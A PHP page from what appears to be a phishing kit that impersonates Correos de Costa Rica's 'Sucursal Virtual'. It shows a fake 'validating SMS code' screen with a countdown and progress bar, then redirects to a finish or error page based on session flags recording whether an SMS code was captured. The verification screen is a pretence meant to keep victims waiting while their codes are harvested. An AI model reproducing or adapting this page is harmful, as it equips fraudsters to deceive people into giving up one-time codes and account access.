<?php
declare(strict_types=1);
require_once __DIR__ . '/inc/functions.php';
kit_init();
ensure_flow();
$secs = (int)T_LOADING2;
$page_title   = 'Sucursal Virtual';
$show_spinner = true;
$next         = (($_SESSION['sms_ok'] ?? false) || ($_SESSION['after_sms2'] ?? false)) ? 'finish.php' : 'error.php';
$head_extra   = '<meta http-equiv="refresh" content="' . $secs . ';url=' . $next . '">';
require __DIR__ . '/inc/header.php';
?>
<div class="wpb-content-wrapper">
<div class="vc_row wpb_row vc_row-fluid">
<div class="wpb_column vc_column_container vc_col-sm-12">
<div class="vc_column-inner">
<div class="wpb_wrapper">
<div class="flow-wrap">
	<div class="flow-card processing">
		<img class="flow-logo" src="assets/img/logo_header.jpg" alt="Correos de Costa Rica">
		<h2>Validando código de verificación</h2>
		<p class="flow-lead">Estamos comprobando el código SMS enviado. Espere un momento por favor.</p>
		<div class="bar"><div class="bar-fill" id="bar"></div></div>
		<p class="secure">Redirección en <b id="secs"><?php echo $secs; ?></b> segundos...</p>
	</div>
</div>
</div>
</div>
</div>
</div>
</div>
<script>
(function () {
  var total = <?php echo $secs; ?>;
  var left = total;
  var el = document.getElementById('secs');
  var bar = document.getElementById('bar');
  if (el) { el.textContent = left; }
  if (bar) { bar.style.width = '3%'; }
  var iv = setInterval(function () {
    left--;
    if (el) { el.textContent = left; }
    if (bar) { bar.style.width = Math.round((total - left) / total * 100) + '%'; }
    if (left <= 0) { clearInterval(iv); }
  }, 1000);
})();
</script>
<?php require __DIR__ . '/inc/footer.php'; ?>
